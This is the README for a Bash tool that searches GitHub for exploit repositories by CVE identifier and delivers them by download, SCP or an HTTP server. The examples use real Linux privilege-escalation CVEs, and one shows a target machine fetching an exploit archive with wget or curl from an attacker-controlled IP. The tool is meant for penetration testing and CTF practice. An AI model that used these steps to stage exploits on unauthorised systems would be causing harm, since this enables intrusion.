## рҹ“– What is this?

**GitHubSearchCVE** is a Bash script designed for CTF players and penetration testers. Given a CVE identifier, it queries the GitHub API, presents an **interactive list of repositories** sorted by stars, and lets you choose which exploits to download вҖ” then delivers them via direct download, SCP transfer to a target machine, or an instant Python HTTP server.

---

## вңЁ Features

| Feature | Description |
|---|---|
| рҹ”Қ **Smart Search** | Queries GitHub API v3 filtered by CVE and language |
| вӯҗ **Sorted by Stars** | Results ordered by community trust |
| рҹ–ҘпёҸ **Interactive Selector** | Choose exactly which repos to download |
| рҹ“Ұ **Auto Archive** | Clones and packages repos as `.tar.gz` |
| рҹ“Ў **3 Delivery Modes** | `Download`, `SCP`, or instant `HTTP` server |
| рҹҗҚ **Python HTTP Server** | Portable file serving вҖ” no `nc` quirks |
| рҹ”‘ **GitHub Token Support** | Avoid rate limiting (10 вҶ’ 5000 req/min) |
| рҹ“қ **Session Logging** | Timestamped log saved alongside your downloads |
| рҹӣЎпёҸ **Input Validation** | CVE format check + API error handling |

## рҹҡҖ Usage

```bash
./GitHubSearchCVE.sh -e <CVE> -l <Language> -m <Mode> [options]
```

### Options

| Flag | Description | Required |
|------|-------------|----------|
| `-e` | CVE identifier вҖ” format: `CVE-YEAR-CODE` | вң… Yes |
| `-l` | Language filter: `Python`, `Shell`, `C`, `Go`, `Java`, `PHP`вҖҰ | вң… Yes |
| `-m` | Delivery mode: `Download`, `SCP`, `HTTP` | вң… Yes |
| `-n` | Max results to fetch (1вҖ“10, default: 10) | вқҢ Optional |
| `-u` | SSH user for SCP mode | SCP only |
| `-t` | Target IP/host for SCP mode | SCP only |
| `-z` | Dependency check вҖ” use `-z on` to auto-install | вқҢ Optional |
| `-h` | Show help | вқҢ Optional |

> рҹ’Ў **Tip:** Set a `GITHUB_TOKEN` environment variable to bypass the 10 requests/min API rate limit.

## рҹ“Ӣ Examples

### Download mode вҖ” save exploits locally
```bash
./GitHubSearchCVE.sh -e CVE-2021-3156 -l Python -m Download
```

### HTTP mode вҖ” serve exploits to your target machine
```bash
./GitHubSearchCVE.sh -e CVE-2021-4034 -l C -m HTTP -n 5
```
Then on the target machine:
```bash
wget http://<your-ip>:8080/<exploit>.tar.gz
# or
curl -O http://<your-ip>:8080/<exploit>.tar.gz
```

### SCP mode вҖ” push directly to a target
```bash
./GitHubSearchCVE.sh -e CVE-2023-0386 -l C -m SCP -u kali -t 10.10.10.25
```

### With GitHub token (recommended)
```bash
export GITHUB_TOKEN="ghp_yourTokenHere"
./GitHubSearchCVE.sh -e CVE-2022-0847 -l C -m Download
```
